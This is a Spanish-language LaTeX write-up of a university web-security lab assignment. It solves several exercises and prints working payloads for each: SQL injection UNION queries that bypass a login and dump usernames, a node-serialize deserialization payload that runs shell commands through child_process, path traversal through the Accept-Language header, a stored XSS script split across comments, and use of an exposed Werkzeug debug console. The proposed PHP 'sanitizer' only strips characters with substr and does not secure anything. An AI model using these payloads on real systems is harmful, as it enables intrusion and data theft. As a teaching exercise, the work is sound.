@@ -1,0 +1,349 @@
+%% LyX 2.3.5.2 created this file.  For more info, see http://www.lyx.org/.
+%% Do not edit unless you really know what you are doing.
+\documentclass[english]{article}
+\usepackage[T1]{fontenc}
+\usepackage[latin9]{inputenc}
+
+\makeatletter
+\@ifundefined{date}{}{\date{}}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% User specified LaTeX commands.
+\usepackage{xcolor}
+\usepackage{listings}
+\lstset{basicstyle=\ttfamily,
+  showstringspaces=false,
+  commentstyle=\color{red},
+  keywordstyle=\color{blue}
+}
+
+\makeatother
+
+\usepackage{babel}
+\begin{document}
+\title{\underline{Práctica 2 : Seguridad Web}}
+\author{\underline{Alumno:Pablo Alonso}}
+\maketitle
+
+\subsection*{1)}
+
+\subsection*{a-}
+
+Al provocar un error en la consulta sql, por ejemplo con bob' UNION SELECT NULL,
+se presenta un Traceback y al seleccionar una linea de código accedemos
+al código fuente. Leyendo el código fuente se inyecta el siguiente
+fragmento de consulta para vulnerar el login ingresando lo siguiente
+en el username:
+
+\begin{lstlisting}[language=sql,caption={}]
+dafd' UNION SELECT 1,
+'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb','' --
+\end{lstlisting}
+
+\medskip{}
+
+En la password se ingresa solo 'a' y se accede al secreto de bob:
+i have no secrets .
+
+\subsection*{b-}
+
+El servidor lanza una excepción si el user\_id devuelto por la consulta
+no se trata de una clave en el diccionario que guarda los secretos,
+en el cual se imprime el resultado de la consulta. Aprovechando eso,
+se puede inyectar el siguiente código a travez del username:
+
+\begin{lstlisting}[language=sql,caption={}]
+dfas' UNION SELECT 
+(SELECT COUNT(id) FROM(users),
+'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',
+'' --
+\end{lstlisting}
+
+Nuevamente se ingresa 'a' como password y se imprime lo siguiente:
+KeyError '6', 6 corresponde al resultado de la consulta SELECT COUNT(id)
+FROM(users).
+
+\subsection*{c-}
+
+Aprovechando lo anterior, se inyecta:
+
+\begin{lstlisting}[language=sql,caption={}]
+asdf' UNION SELECT
+(SELECT GROUP_CONCAT(username) FROM users), 
+'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',''
+\end{lstlisting}
+
+Y surge una KeyError exception: KeyError: 'cacho,bob,john,mallory,eve,kisio'.
+
+'cacho,bob,john,mallory,eve,kisio' corresponde al resultado de SELECT
+GROUP\_CONCAT(username) FROM users.
+
+\subsection*{2)}
+
+\subsection*{a-}
+
+Se utiliza Javascript del lado del servidor.
+
+\subsection*{b-}
+
+Al ingresar por primera vez el sitio no muestra nada interesante.
+Si se refresca surge un error del tipo ``SyntaxError: Unexpected
+token F in JSON at position 79 at JSON.parse''. Es decir que se está
+mandando información al servidor web en forma de objeto JSON y este
+intenta deserializarlo para transformarlo en un objeto Javascript.
+Al interceptar un paquete con Burp Suite se observa que el servidor
+asigna una cookie al navegador. El token de la cookie es:
+
+eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZn
+
+MzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwM
+
+TggMDA6MDA6MDAgR01UIn0\%3D.
+
+Dado que '\%3D' es '=' encodeado en URL encoding se reemplaza y decodifica
+en base64:
+
+\{\textquotedbl username\textquotedbl :\textquotedbl Admin\textquotedbl ,\textquotedbl csrftoken\textquotedbl :\textquotedbl u32t4o3tb3gg431fs34ggdgchjwnza0l=\textquotedbl ,\textquotedbl Expires=\textquotedbl :Friday,
+13 Oct 2018 00:00:00 GMT\textquotedbl\}
+
+Observar que la falta de `` en Friday explica el error con el que
+resonde el servidor. Esto da el indició de que lo que se intenta deserializar
+a objeto Javascript es el token decodificado que se pasa como Cookie.
+Se codifica el siguiente JSON en base64 y se envia como cookie:
+
+\{\textquotedbl username\textquotedbl :\textquotedbl Admin\textquotedbl ,\textquotedbl csrftoken\textquotedbl :\textquotedbl u32t4o3tb3gg431fs34ggdgchjwnza0l=\textquotedbl ,\textquotedbl Expires=\textquotedbl :\textquotedbl Friday,
+13 Oct 2018 00:00:00 GMT\textquotedbl\}
+
+La respuesta es ``Hello Admin'', es decir que dentro de la aplicación
+se invoca al atributo username.
+
+\subsection*{c-}
+
+Una forma de explotar la vulnerabilidad encontrada es pasar como valor
+de username una función que se termine ejecutando del lado del servidor,
+para conseguir el token que vamos a pasar como cookie se ejecuta el
+siguiente código javascript:
+
+\lstdefinelanguage{javascript}{   keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},   keywordstyle=\color{blue}\bfseries,   ndkeywords={class, export, boolean, throw, implements, import, this},   ndkeywordstyle=\color{darkgray}\bfseries,   identifierstyle=\color{black},   sensitive=false,   comment=[l]{//},   morecomment=[s]{/*}{*/},   commentstyle=\color{purple}\ttfamily,   stringstyle=\color{red}\ttfamily,   morestring=[b]',   morestring=[b]" }
+\lstset{    language=JavaScript,    backgroundcolor=\color{lightgray},    extendedchars=true,    basicstyle=\footnotesize\ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,    numberstyle=\footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=false,    captionpos=b } 
+\begin{lstlisting}[language=javaScript,caption={}]
+var comm = 'cat server.js'
+var y = {	
+    username: function(){
+          var execSync = require('child_process').execSync;
+          return execSync(comm, { encoding: 'utf-8' });
+    },
+      
+}
+var serialize = require('node-serialize'); 
+console.log("Serialized:" + serialize.serialize(y));
+\end{lstlisting}
+
+Obtenemos el siguiente JSON:
+
+\{``username'': \textquotedbl\_\$\$ND\_FUNC\$\$\_function ()\{
+var execSync = require('child\_process').execSync;return execSync('cat
+server.js', \{ encoding: 'utf-8' \}) \}()\textquotedbl{} \}
+
+Se encodea en base64 y se lo agrega como cookie. Luego cuando la aplicación
+procesa esta request termina ejecutando el comando pasado.
+
+\subsection*{3)}
+
+\subsection*{a- }
+
+La apicación es vulnerable a sql injection a trávez del parámetro
+id que se pasa por GET. Esto es comprobable al percibir respuestas
+distintas al agregar junto con el id fragmentos de consultas del tipo
+and o union.
+
+\subsection*{b-}
+
+Se puede obtener el código de la aplicación ya que la consulta que
+se realiza con el parámetro id retorna la ruta del archivo. Entonces
+mandando ``id=9 UNION SELECT alguna\_ruta'' se puede leer cualquier
+contenido dentro de la aplicación. El único problema es que no se
+conoce los nombres de los archivos de la aplicación entonces hacemos
+uso de la tool intruder de BurpSuite para hacer un ataque por diccionario
+hasta dar con el nombre de algún archivo dentro de la aplicación.
+Finalmente se logra dar con main.py y se encuentra la FLAG:''SEGURIDAD-OFENSIVA-FAMAF''.
+
+\subsection*{4)}
+
+\subsection*{a-}
+
+Usando Burp Suite, podríamos capturar una request como esta:
+
+GET / HTTP/1.1
+
+Host: 143.0.100.198:5010 
+
+User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,{*}/{*};q=0.8 
+
+Accept-Language: en-US,en;q=0.5 
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0 
+
+\medskip{}
+
+Y modificarla de la siguiente manera:
+
+\medskip{}
+
+GET / HTTP/1.1
+
+Host: 143.0.100.198:5010 
+
+User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101
+Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,{*}/{*};q=0.8 
+
+Accept-Language: ....//what\_i\_want
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0 
+
+\medskip{}
+
+Basta reemplazar what\_i\_want para escaparse de la carpeta lang e
+incluir otros archivos locales del servidor dentro del script. 
+
+\medskip{}
+
+
+\subsection*{b-}
+
+Un script mas adecuado seria:
+
+\lstset{   language        = php,   basicstyle      = \small\ttfamily,   keywordstyle    = \color{dkblue},   stringstyle     = \color{red},   identifierstyle = \color{dkgreen},   commentstyle    = \color{gray},   emph            =[1]{php},   emphstyle       =[1]\color{black},   emph            =[2]{if,and,or,else},   emphstyle       =[2]\color{dkyellow}}
+\lstset{    language=php,    backgroundcolor=\color{lightgray},    extendedchars=true,    basicstyle=\footnotesize\ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,    numberstyle=\footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=false,    captionpos=b } 
+\begin{lstlisting}[language=javaScript,caption={}]
+<?php class LangMgr{ 
+       public function newLang(){ 
+            $lang = $this->getBrowserLang();
+            $sanitizedLang = $this->sanitizeLang($lang);
+            require_once("/lang/$sanitizedLang");
+       }
+
+       private function getBrowserLang(){
+            $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
+            return $lang;
+       }
+
+      private function sanitizeLang($lang){
+            return substr($lang,2);
+      }
+}
+
+(new LangMgr())->newLang(); ?>
+\end{lstlisting}
+
+\subsection*{5)}
+
+El tipo de ataque que se lleva a cabo sobre la máquina owaspbwa es
+del tipo XSS Stored. Se observa que una base de tados almacena el
+nombre y el mensaje ingresados y que la aplicación los agrega en el
+html de respuesta tal cual se ingresan. La idea es insertar un script
+como el que se describe a continuación:
+
+\lstdefinelanguage{javascript}{   keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},   keywordstyle=\color{blue}\bfseries,   ndkeywords={class, export, boolean, throw, implements, import, this},   ndkeywordstyle=\color{darkgray}\bfseries,   identifierstyle=\color{black},   sensitive=false,   comment=[l]{//},   morecomment=[s]{/*}{*/},   commentstyle=\color{purple}\ttfamily,   stringstyle=\color{red}\ttfamily,   morestring=[b]',   morestring=[b]" }
+\lstset{    language=JavaScript,    backgroundcolor=\color{lightgray},    extendedchars=true,    basicstyle=\footnotesize\ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,    numberstyle=\footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=false,    captionpos=b } 
+\begin{lstlisting}[language=javaScript,caption={}]
+<script>
+var i = 0;
+document.getElementsByTagName("textarea")[0].onkeypress=function(){
+alert(i);i++;};
+</script>
+\end{lstlisting}
+
+Dado que el textarea que ofrece el sitio acepta una pequeña cantidad
+de carácteres, se hace uso de los comentarios para trozar el script
+en pequeños fragmentos y poder ingresarlo al sistema de la aplicación.
+Entonces se ingresan nombres y mensajes como los que siguen:
+
+\medskip{}
+
+nombre:1
+
+mensaje:<script>/{*}
+
+\medskip{}
+
+nombre:2
+
+mensaje:{*}/var i = 0;/{*}
+
+\medskip{}
+
+nombre:3
+
+mensaje:{*}/document./{*}
+
+\medskip{}
+
+nombre:4
+
+mensaje:{*}/getElementsByTagName(\textquotedbl textarea\textquotedbl ){[}0{]}/{*}
+
+\medskip{}
+
+nombre:5
+
+mensaje:{*}/.onkeypress=function()/{*}
+
+\medskip{}
+
+nombre:6
+
+mensaje:{*}/\{alert(i);i++;\};/{*}
+
+\medskip{}
+
+nombre:7
+
+mensaje:{*}/</script>
+
+\medskip{}
+
+Y se logra capturar el evento de que el usuario de la aplicación pulse
+una tecla.
+
+\subsection*{6)}
+
+\subsection*{a-}
+
+Flag:ThIs\_Even\_PaSsED\_c0d3\_rewVIEW
+
+\subsection*{b-}
+
+Se observa en el header server que la tecnología que se usa en el
+servidor web es Werkzeug 0.10.4. Investigando esta tecnología se descubre
+que el debuguer permite abrir una consola python en la aplicación
+web la cuál puede ejecutar codigo arbitrario dentro del contexto de
+la aplicación web. Invocamos dicha consola en http://143.0.100.198:5001/console
+. Una vez dentro de la consola observamos la siguiente linea de código:
+
+\begin{lstlisting}[language=python,caption={}]
+ app.run(debug=True, host="0.0.0.0", port=1337)
+\end{lstlisting}
+
+En resumen, el error es que se esta corriendo la aplicación web dentro
+de un servidor de producción con la bandera de debug encencida y esto
+habilita una consola dentro de la aplicación disponible para cualquier
+intruso.
+
+Otra alternativa para encontrar esta vulnerabilidad es con dirbuster.
+\end{document}
